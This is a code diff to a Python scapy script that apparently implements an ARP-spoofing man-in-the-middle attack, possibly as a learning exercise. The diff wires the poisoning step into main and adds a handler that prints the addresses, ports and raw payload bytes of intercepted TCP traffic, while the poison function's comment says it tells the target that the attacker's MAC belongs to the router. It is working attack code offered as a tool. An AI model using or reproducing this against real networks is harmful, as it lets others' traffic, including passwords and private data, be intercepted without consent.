@@ -10,8 +10,16 @@ def restore(destination_ip, source_ip, destination_mac, source_mac):
 	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
 	scapy.send(packet, verbose = False)
 
-def handlePackets():
-	print("hello")
+def handlePackets(packet):
+	if packet.haslayer(scapy.TCP):
+		src_ip = packet[scapy.IP].src
+		dst_ip = packet[scapy.IP].dst
+		src_port = packet[scapy.TCP].sport
+		dst_port = packet[scapy.TCP].dport
+		print(f"TCP Packet: {src_ip}:{src_port} -> {dst_ip}:{dst_port}")
+		if packet[scapy.TCP].payload:
+			print(f"Payload: {bytes(packet[scapy.TCP].payload)}")
+		print("-" * 50)
 
 def poison(args):
 	spoof(args.IP_target, args.MAC_target, args.IP_src) # Tells the target (his IP and MAC address) that my MAC address is linked to the router's IP
@@ -44,6 +52,7 @@ def main() :
 		isValidMacAddress(args.MAC_src)
 		isValidIp(args.IP_target)
 		isValidMacAddress(args.MAC_src)
+		poison(args)
 	except ValueError as e:
 		print(f"ValueError: {e}")
 	except Exception as e:
